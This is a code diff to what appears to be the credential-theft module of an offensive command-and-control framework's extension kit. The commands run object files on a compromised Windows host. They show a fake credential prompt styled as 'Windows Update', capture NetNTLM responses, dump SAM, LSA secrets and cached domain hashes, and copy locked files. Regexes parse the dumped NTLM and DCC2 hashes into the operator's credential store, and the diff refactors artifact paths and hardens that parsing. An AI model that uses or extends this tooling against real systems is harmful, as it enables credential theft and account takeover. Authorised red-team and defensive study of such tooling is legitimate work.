@@ -7,6 +7,18 @@ ax.script_import(ax.script_dir() + "nanodump/nanodump.axs")
 ax.script_import(ax.script_dir() + "cookie-monster/cookie-monster.axs")
 ax.script_import(ax.script_dir() + "mimikatz/mimikatz.axs")
 
+function creds_bof_path(id, name) {
+    let arch = ax.arch(id);
+    let bof_path = ax.script_dir() + "_bin/" + name + "." + arch + ".o";
+    if (!ax.file_exists(bof_path)) {
+        throw new Error(
+            "Creds-BOF artifact is missing: " + name + "." + arch + ".o. " +
+            "Build it with make -C Extension-Kit/Creds-BOF, then reload the Creds-BOF AxScript."
+        );
+    }
+    return bof_path;
+}
+
 /// COMMANDS
 
 var cmd_askcreds = ax.create_command("askcreds", "Prompt for credentials", "askcreds -p \"Windows Update\"");
@@ -23,7 +35,7 @@ cmd_askcreds.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
     let bof_params = ax.bof_pack("wstr,wstr,int", [prompt, note, wait_time]);
-    let bof_path = ax.script_dir() + "_bin/askcreds." + ax.arch(id) + ".o";
+    let bof_path = creds_bof_path(id, "askcreds");
 
     ax.execute_alias(id, cmdline, `execute bof ${async}"${bof_path}" ${bof_params}`, "BOF implementation: askcreds");
 });
@@ -37,7 +49,7 @@ cmd_get_ntlm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     if(parsed_json["--no-ess"]) { no_ess = 1; }
 
     let bof_params = ax.bof_pack("int", [no_ess]);
-    let bof_path = ax.script_dir() + "_bin/get-netntlm." + ax.arch(id) + ".o";
+    let bof_path = creds_bof_path(id, "get-netntlm");
 
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF implementation: Internal Monologue");
 });
@@ -53,14 +65,14 @@ cmd_hashdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
         let address = agent["internal_ip"];
 
         let match;
-        let regex = /^([a-zA-Z0-9_\-]+):\d+:([a-fA-F0-9]{32})$/gm;
+        let regex = /^([a-zA-Z0-9_\-]+):\d+:([a-fA-F0-9]{32})\r?$/gm;
         while ((match = regex.exec(task.text)) !== null) {
             ax.credentials_add(match[1], match[2], "", "ntlm", "", "SAM", `${computer} (${address})`);
         }
 
         return task;
     }
-    let bof_path = ax.script_dir() + "_bin/hashdump." + ax.arch(id) + ".o";
+    let bof_path = creds_bof_path(id, "hashdump");
 
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF implementation: hashdump", hook);
 });
@@ -221,7 +233,7 @@ cmd_lsadump_secrets.setPreHook(function (id, cmdline, parsed_json, ...parsed_lin
 
         return task;
     }
-    let bof_path = ax.script_dir() + "_bin/lsadump_secrets." + ax.arch(id) + ".o";
+    let bof_path = creds_bof_path(id, "lsadump_secrets");
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF: lsadump::secrets", hook);
 });
 
@@ -234,13 +246,13 @@ cmd_lsadump_sam.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
         let address = agent["internal_ip"];
 
         let match;
-        let regex = /^([a-zA-Z0-9_\-]+):(\d+):([a-fA-F0-9]{32})$/gm;
+        let regex = /^([a-zA-Z0-9_\-]+):(\d+):([a-fA-F0-9]{32})\r?$/gm;
         while ((match = regex.exec(task.text)) !== null) {
             ax.credentials_add(match[1], match[3], "", "ntlm", "", "SAM", `${computer} (${address})`);
         }
         return task;
     }
-    let bof_path = ax.script_dir() + "_bin/lsadump_sam." + ax.arch(id) + ".o";
+    let bof_path = creds_bof_path(id, "lsadump_sam");
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF: lsadump::sam", hook);
 });
 
@@ -254,16 +266,16 @@ cmd_lsadump_cache.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
 
         let match;
         // Match: MsCacheV2 : <hash>
-        let regex = /User\s+:\s+([^\\\n]+)\\([^\n]+)\nMsCacheV2\s+:\s+([a-fA-F0-9]{32})/gm;
+        let regex = /User\s+:\s+([^\\\r\n]+)\\([^\r\n]+)\r?\nMsCacheV2\s+:\s+([a-fA-F0-9]{32})/gm;
         while ((match = regex.exec(task.text)) !== null) {
-            let domain = match[1];
-            let username = match[2];
-            let hash = match[3];
+            let domain = match[1].trim();
+            let username = match[2].trim();
+            let hash = match[3].trim();
             ax.credentials_add(username, hash, "", "dcc2", domain, "DCC2", `${computer} (${address})`);
         }
         return task;
     }
-    let bof_path = ax.script_dir() + "_bin/lsadump_cache." + ax.arch(id) + ".o";
+    let bof_path = creds_bof_path(id, "lsadump_cache");
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF: lsadump::cache", hook);
 });
 
@@ -296,7 +308,7 @@ cmd_underlaycopy.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
     // Always pass destination (empty string if not provided)
     // The order matters: mode, source, dest, download
     let bof_params = ax.bof_pack("cstr,cstr,cstr,int", [mode, source, dest || "", download]);
-    let bof_path = ax.script_dir() + "_bin/underlaycopy." + ax.arch(id) + ".o";
+    let bof_path = creds_bof_path(id, "underlaycopy");
 
     let task_desc = download ? "Task: UnderlayCopy file copy and download to server" : "Task: UnderlayCopy file copy";
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, task_desc);
